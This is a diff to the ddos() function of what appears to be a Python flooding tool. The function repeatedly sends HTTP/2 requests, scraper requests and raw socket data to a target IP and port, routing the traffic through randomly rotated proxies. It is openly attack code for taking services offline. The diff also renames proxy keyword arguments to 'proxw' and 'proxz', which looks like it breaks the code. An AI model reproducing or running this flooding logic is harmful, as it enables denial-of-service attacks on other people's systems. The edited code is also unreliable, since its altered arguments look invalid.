@@ -2507,7 +2507,7 @@ def ddos():
             s.connect((ip,port))
             client = httpx.Client(
                 http2=True,
-                proxies={
+                proxw={
                     'http://': 'http://'+random.choice(proxz),
                     'https://': 'http://'+random.choice(proxz),
                 }
@@ -2515,13 +2515,13 @@ def ddos():
             client.get(ip, headers=headers)
             client.get(ip, headers=headers)
             proxy = {
-                    'http': 'http://'+str(random.choice(list(proxies))),   
-                    'https': 'http://'+str(random.choice(list(proxies))),
+                    'http': 'http://'+str(random.choice(list(proxz))),   
+                    'https': 'http://'+str(random.choice(list(proxz))),
             }
-            scraper.get(ip, proxies=proxy)
-            scraper.get(ip, proxies=proxy)
-            scraper.get(ip, proxies=proxy)
-            scraper.get(ip, proxies=proxy)
+            scraper.get(ip, proxz=proxy)
+            scraper.get(ip, proxz=proxy)
+            scraper.get(ip, proxz=proxy)
+            scraper.get(ip, proxz=proxy)
             s.send(data)
             s.send(data)
             s.send(data)
